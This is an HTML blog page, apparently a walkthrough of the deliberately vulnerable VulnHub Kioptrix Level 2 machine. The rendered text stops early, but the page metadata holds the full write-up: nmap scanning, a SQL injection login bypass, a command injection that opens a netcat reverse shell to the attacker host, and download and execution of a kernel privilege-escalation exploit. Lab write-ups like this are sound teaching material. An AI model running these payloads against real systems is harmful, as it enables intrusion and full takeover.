@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>VulnHub: Kioptrix Lv2 | The Cyber Security Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Description VulnHub: Kioptrix: Level 2
+The object of the game is to acquire root access via any means possible
+Reconnaissance $ sudo netdiscover -i eth0 $ sudo nmap -p- -A -T5 -v 192.168.127.130 # Output PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) | ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1) | 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA) |_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 2.">
+<meta name="author" content="">
+<link rel="canonical" href="https://dimparar.github.io/thecybersecurityblog/docs/kioptrix_lv2/">
+<link crossorigin="anonymous" href="/thecybersecurityblog/assets/css/stylesheet.0643a4ac9748f29ce8d3091f50d24ce1a495a913c3b0218c829cd6c1aec7a488.css" integrity="sha256-BkOkrJdI8pzo0wkfUNJM4aSVqRPDsCGMgpzWwa7HpIg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://dimparar.github.io/thecybersecurityblog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dimparar.github.io/thecybersecurityblog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://dimparar.github.io/thecybersecurityblog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://dimparar.github.io/thecybersecurityblog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://dimparar.github.io/thecybersecurityblog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://dimparar.github.io/thecybersecurityblog/docs/kioptrix_lv2/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="VulnHub: Kioptrix Lv2" />
+<meta property="og:description" content="Description VulnHub: Kioptrix: Level 2
+The object of the game is to acquire root access via any means possible
+Reconnaissance $ sudo netdiscover -i eth0 $ sudo nmap -p- -A -T5 -v 192.168.127.130 # Output PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) | ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1) | 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA) |_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dimparar.github.io/thecybersecurityblog/docs/kioptrix_lv2/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2026-09-07T09:39:09+03:00" />
+<meta property="article:modified_time" content="2026-09-07T09:39:09+03:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="VulnHub: Kioptrix Lv2"/>
+<meta name="twitter:description" content="Description VulnHub: Kioptrix: Level 2
+The object of the game is to acquire root access via any means possible
+Reconnaissance $ sudo netdiscover -i eth0 $ sudo nmap -p- -A -T5 -v 192.168.127.130 # Output PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) | ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1) | 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA) |_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 2."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Docs",
+      "item": "https://dimparar.github.io/thecybersecurityblog/docs/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "VulnHub: Kioptrix Lv2",
+      "item": "https://dimparar.github.io/thecybersecurityblog/docs/kioptrix_lv2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "VulnHub: Kioptrix Lv2",
+  "name": "VulnHub: Kioptrix Lv2",
+  "description": "Description VulnHub: Kioptrix: Level 2\nThe object of the game is to acquire root access via any means possible\nReconnaissance $ sudo netdiscover -i eth0 $ sudo nmap -p- -A -T5 -v 192.168.127.130 # Output PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) | ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1) | 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA) |_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 2.",
+  "keywords": [
+    
+  ],
+  "articleBody": " Description VulnHub: Kioptrix: Level 2\nThe object of the game is to acquire root access via any means possible\nReconnaissance $ sudo netdiscover -i eth0 $ sudo nmap -p- -A -T5 -v 192.168.127.130 # Output PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) | ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1) | 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA) |_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 2.0.52 ((CentOS)) |_http-server-header: Apache/2.0.52 (CentOS) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn't have a title (text/html; charset=UTF-8). 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 793/udp status |_ 100024 1 796/tcp status 443/tcp open ssl/http Apache httpd 2.0.52 ((CentOS)) | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: md5WithRSAEncryption | Not valid before: 2009-10-08T00:10:47 | Not valid after: 2010-10-08T00:10:47 | MD5: 01de 29f9 fbfb 2eb2 beaf e624 3157 090f | SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a |_SHA-256: 5c68 d00c 4866 d81f 6651 99d5 c2da 7e8a 90b6 a3fb 57ca 42a3 3215 6197 26d0 2cd7 | sslv2: | SSLv2 supported | ciphers: | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_DES_64_CBC_WITH_MD5 | SSL2_RC4_64_WITH_MD5 | SSL2_DES_192_EDE3_CBC_WITH_MD5 |_ SSL2_RC4_128_WITH_MD5 |_ssl-date: 2026-08-23T05:56:18+00:00; -3h09m39s from scanner time. |_http-title: Site doesn't have a title (text/html; charset=UTF-8). | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.0.52 (CentOS) 631/tcp open ipp CUPS 1.1 |_http-server-header: CUPS/1.1 |_http-title: 403 Forbidden | http-methods: | Supported Methods: GET HEAD OPTIONS POST PUT |_ Potentially risky methods: PUT 796/tcp open status 1 (RPC #100024) 3306/tcp open mysql MySQL (unauthorized) MAC Address: 00:0C:29:33:26:4A (VMware) Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.9 - 2.6.30 Uptime guess: 49.709 days (since Sat Jul 4 12:04:26 2026) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=199 (Good luck!) IP ID Sequence Generation: All zeros Host script results: |_clock-skew: -3h09m39s TRACEROUTE HOP RTT ADDRESS 1 1.16 ms 192.168.127.130 # Use -sU to check UDP ports $ sudo nmap -p- -sU -sV 192.168.127.130 # Output PORT STATE SERVICE VERSION 22/udp closed ssh 631/udp open|filtered ipp MAC Address: 00:0C:29:33:26:4A (VMware) Enumeration IPP/CUPS Port 631 The CUPS server allows users to manage print jobs through the TCP/631 port and automatic printer discovery through UDP/631. So when we see TCP/631 open it is possible for the UDP/631 to be also open.\nOne attack vector could be the UDP/631 port. We may be able to send a malicious printer request Evilsocket.\nBut for now let’s try to enumerate more information from the service.\nDoes nmap has any script which is more specialized on cups or ipp.\n# Use --script-help flag filter the scripts based on a string $ sudo nmap --script-help \"*cups*\" $ sudo nmap --script-help \"*ipp*\" $ sudo nmap -sV -T4 -v --script=cups-info,cups-queue-info 192.168.127.130 No information\nMySQL Port 3306 Port 3306 which is probably MySQL or MariaDB\n# Try to connect with basic username root $ mysql --skip-ssl -h 192.168.127.130 -u root # The IP is not authorized to access MySQL server $ sudo nmap -p3306 -sV -v --script=\"*mysql*\" 192.168.127.130 # Not authorized HTTP Port 80 Check front-end source file through Ctrl+U.\n# Check different HTTP methods that are allowed in case we can learn something $ curl http://192.168.127.130:80/ -I $ curl http://192.168.127.130:80/ -X OPTIONS # Start burpsuite $ burpsuite \u0026 # Bruteforce web directories $ ffuf -u http://192.168.127.130:80/FUZZ \\ -w /usr/share/wordlists/dirb/common.txt 2\u003e/dev/null $ ffuf -u http://192.168.127.130:80/FUZZ \\ -w /usr/share/wordlists/dirb/big.txt 2\u003e/dev/null Check XSS and SQLi.\n#SQLi ' or 1=1 -- - It worked. The check was probably something like this:\n# Normal SELECT * FROM users WHERE username='admin' AND password='pass'; # Bypass SELECT * FROM users WHERE username='' or 1=1 -- -AND password='pass' It probably runs a ping simple ping command. We may be able to achieve bash command injection.\nWe have access to the system through Command Injection leading to RCE. Now we use nc to get a remote shell.\n# From Kali listen to 1234 $ nc -lnvp 1234 # use nc (netcat) for reverse shell 127.0.0.1\u0026\u0026nc 192.168.127.128 1234 -e \"/bin/bash\" # No output... maybe nc is not installed 127.0.0.1\u0026\u0026find / -name \"nc\" 2\u003e/dev/null -ls # /usr/local/bin/nc 127.0.0.1\u0026\u0026/usr/local/bin/nc 192.168.127.128 1234 -e \"/bin/bash\" # Connected Privilege Escalation Try some basic Linux commands to get information about the system and the user.\n$ id $ whoami $ groups $ pwd $ uname -a # Output # Linux Kernel 2.6.9-55.EL From a quick Google search, this Linux Kernel version is exploitable, Exploit DB: Linux Kernel 2.6 \u003c 2.6.19l\n# From Kali $ wget https://www.exploit-db.com/download/9542 $ python3 -m http.server 7777 # From Kioptrix $ wget http://192.168.127.128/exploit.c $ gcc exploit.c -o exploit $ chmod +x ./exploit $ ./exploit # We are root! ",
+  "wordCount" : "800",
+  "inLanguage": "en",
+  "datePublished": "2026-09-07T09:39:09+03:00",
+  "dateModified": "2026-09-07T09:39:09+03:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://dimparar.github.io/thecybersecurityblog/docs/kioptrix_lv2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "The Cyber Security Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://dimparar.github.io/thecybersecurityblog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+    <nav class="nav">
+        <div class="head-class">
+            <div class="logo">
+                <a href="https://dimparar.github.io/thecybersecurityblog/" accesskey="h" title="The Cyber Security Blog (Alt + H)">The Cyber Security Blog</a>
+                
+            </div>
+            <ul id="menu">
+                
+                <li>
+                    <a href="https://dimparar.github.io/thecybersecurityblog/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                
+                    <li>|</li>
+                
+                <li>
+                    <a href="https://dimparar.github.io/thecybersecurityblog/blog/" title="Blog">
+                        <span>Blog</span>
+                    </a>
+                </li>
+                
+                    <li>|</li>
+                
+                <li>
+                    <a href="https://dimparar.github.io/thecybersecurityblog/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+                
+                    <li>|</li>
+                
+                <li>
+                    <a href="https://dimparar.github.io/thecybersecurityblog/about/" title="About">
+                        <span>About</span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      VulnHub: Kioptrix Lv2
+    </h1>
+    <div class="post-meta"><span title='2026-09-07 09:39:09 +0300 +0300'>07 Sep 2026</span>
+
+</div>
+  </header>
+  
+  <div class="post-body with-toc">
+    <div class="toc-terminal" aria-label="Table of Contents">
+      <div class="toc-terminal-heading">Table of Contents</div>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#ippcups-port-631">IPP/CUPS Port 631</a></li>
+        <li><a href="#mysql-port-3306">MySQL Port 3306</a></li>
+        <li><a href="#http-port-80">HTTP Port 80</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+      <script>
+        (function () {
+          function init() {
+            var nav = document.querySelector(".toc-terminal #TableOfContents");
+            if (!nav) return;
+            var items = nav.querySelectorAll("li");
+            var links = Array.prototype.slice.call(nav.querySelectorAll("a"));
+            var headings = links.map(function (a) {
+              var id = a.getAttribute("href");
+              if (!id || id.charAt(0) !== "#") return null;
+              return document.getElementById(id.slice(1));
+            }).filter(Boolean);
+            if (!headings.length) return;
+
+            function setActive(id) {
+              Array.prototype.forEach.call(items, function (li) {
+                var inside = false;
+                if (id) {
+                  inside = !!li.querySelector('a[href="#' + id + '"]');
+                }
+                li.classList.toggle("is-active", inside);
+              });
+            }
+
+            function onScroll() {
+              var offset = 60;
+              var currentId = null;
+              if ((window.innerHeight + window.pageYOffset) >= document.documentElement.scrollHeight - 4) {
+                currentId = headings[headings.length - 1].id;
+              } else {
+                for (var i = 0; i < headings.length; i++) {
+                  if (headings[i].getBoundingClientRect().top <= offset) {
+                    currentId = headings[i].id;
+                  } else {
+                    break;
+                  }
+                }
+              }
+              setActive(currentId);
+            }
+
+            window.addEventListener("scroll", onScroll, { passive: true });
+            window.addEventListener("resize", onScroll);
+            onScroll();
+          }
+
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", init);
+          } else {
+            init();
+          }
+        })();
+      </script>
+    </div>
+
+    <div class="post-main"> 
+      <div class="post-content"><hr>
+<h2 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h2>
+<p>VulnHub: <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix: Level 2</a></p>
+<p>The object of the game is to acquire root access via any means possible</p>
+<hr>
+<h2 id="reconnaissance">Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#reconnaissance">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo netdiscover -i eth0
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -p- -A -T5 -v 192.168.127.130
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      OpenSSH 3.9p1 <span style="color:#f92672">(</span>protocol 1.99<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">1024</span> 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 <span style="color:#f92672">(</span>RSA1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">1024</span> 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">1024</span> 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_sshv1: Server supports SSHv1
+</span></span><span style="display:flex;"><span>80/tcp   open  http     Apache httpd 2.0.52 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.0.52 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html; charset=UTF-8).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">111/tcp  open  rpcbind  2 (RPC #100000)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| rpcinfo: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   program version    port/proto  service
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   100000  2            111/tcp   rpcbind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   100000  2            111/udp   rpcbind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   100024  1            793/udp   status
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  100024  1            796/tcp   status
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Public Key type: rsa
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Public Key bits: 1024
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Signature Algorithm: md5WithRSAEncryption
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Not valid before: 2009-10-08T00:10:47
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Not valid after:  2010-10-08T00:10:47
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| MD5:     01de 29f9 fbfb 2eb2 beaf e624 3157 090f
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| SHA-1:   560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_SHA-256: 5c68 d00c 4866 d81f 6651 99d5 c2da 7e8a 90b6 a3fb 57ca 42a3 3215 6197 26d0 2cd7
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| sslv2: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   SSLv2 supported
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   ciphers: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     SSL2_RC4_128_EXPORT40_WITH_MD5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     SSL2_RC2_128_CBC_WITH_MD5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     SSL2_DES_64_CBC_WITH_MD5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     SSL2_RC4_64_WITH_MD5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    SSL2_RC4_128_WITH_MD5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ssl-date: 2026-08-23T05:56:18+00:00; -3h09m39s from scanner time.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.0.52 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>631/tcp  open  ipp      CUPS 1.1
+</span></span><span style="display:flex;"><span>|_http-server-header: CUPS/1.1
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|   Supported Methods: GET HEAD OPTIONS POST PUT
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: PUT
+</span></span><span style="display:flex;"><span>796/tcp  open  status   <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100024)</span>
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql    MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:33:26:4A <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Linux 2.6.X
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:2.6
+</span></span><span style="display:flex;"><span>OS details: Linux 2.6.9 - 2.6.30
+</span></span><span style="display:flex;"><span>Uptime guess: 49.709 days <span style="color:#f92672">(</span>since Sat Jul  <span style="color:#ae81ff">4</span> 12:04:26 2026<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
+</span></span><span style="display:flex;"><span>TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">199</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>IP ID Sequence Generation: All zeros
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: -3h09m39s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE
+</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   1.16 ms 192.168.127.130
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Use -sU to check UDP ports</span>
+</span></span><span style="display:flex;"><span>$ sudo nmap -p- -sU -sV 192.168.127.130
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output</span>
+</span></span><span style="display:flex;"><span>PORT    STATE         SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/udp  closed        ssh
+</span></span><span style="display:flex;"><span>631/udp open|filtered ipp
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:33:26:4A <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
+<h3 id="ippcups-port-631">IPP/CUPS Port 631<a hidden class="anchor" aria-hidden="true" href="#ippcups-port-631">#</a></h3>
+<p>The CUPS server allows users to manage print jobs through the <code>TCP/631</code> port and automatic printer discovery through <code>UDP/631</code>. So when we see <code>TCP/631</code> open it is possible for the <code>UDP/631</code> to be also open.</p>
+<p>One attack vector could be the <code>UDP/631</code> port. We may be able to send a malicious printer request <a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">Evilsocket</a>.</p>
+<p>But for now let&rsquo;s try to enumerate more information from the service.</p>
+<p>Does nmap has any script which is more specialized on cups or ipp.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Use --script-help flag filter the scripts based on a string</span>
+</span></span><span style="display:flex;"><span>$ sudo nmap --script-help <span style="color:#e6db74">&#34;*cups*&#34;</span>
+</span></span><span style="display:flex;"><span>$ sudo nmap --script-help <span style="color:#e6db74">&#34;*ipp*&#34;</span>
+</span></span></code></pre></div><p><img loading="lazy" src="lab1.png" alt="alt"  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sV -T4 -v --script<span style="color:#f92672">=</span>cups-info,cups-queue-info 192.168.127.130
+</span></span></code></pre></div><p><img loading="lazy" src="lab2.png" alt="alt"  />
+</p>
+<p>No information</p>
+<h3 id="mysql-port-3306">MySQL Port 3306<a hidden class="anchor" aria-hidden="true" href="#mysql-port-3306">#</a></h3>
+<p><code>Port 3306</code> which is probably MySQL or MariaDB</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Try to connect with basic username root</span>
+</span></span><span style="display:flex;"><span>$ mysql --skip-ssl -h 192.168.127.130 -u root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The IP is not authorized to access MySQL server</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ sudo nmap -p3306 -sV -v --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*mysql*&#34;</span> 192.168.127.130
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Not authorized</span>
+</span></span></code></pre></div><h3 id="http-port-80">HTTP Port 80<a hidden class="anchor" aria-hidden="true" href="#http-port-80">#</a></h3>
+<p>Check front-end source file through Ctrl+U.</p>
+<p><img loading="lazy" src="lab3.png" alt="alt"  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Check different HTTP methods that are allowed in case we can learn something</span>
+</span></span><span style="display:flex;"><span>$ curl http://192.168.127.130:80/ -I
+</span></span><span style="display:flex;"><span>$ curl http://192.168.127.130:80/ -X OPTIONS
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Start burpsuite</span>
+</span></span><span style="display:flex;"><span>$ burpsuite &amp;
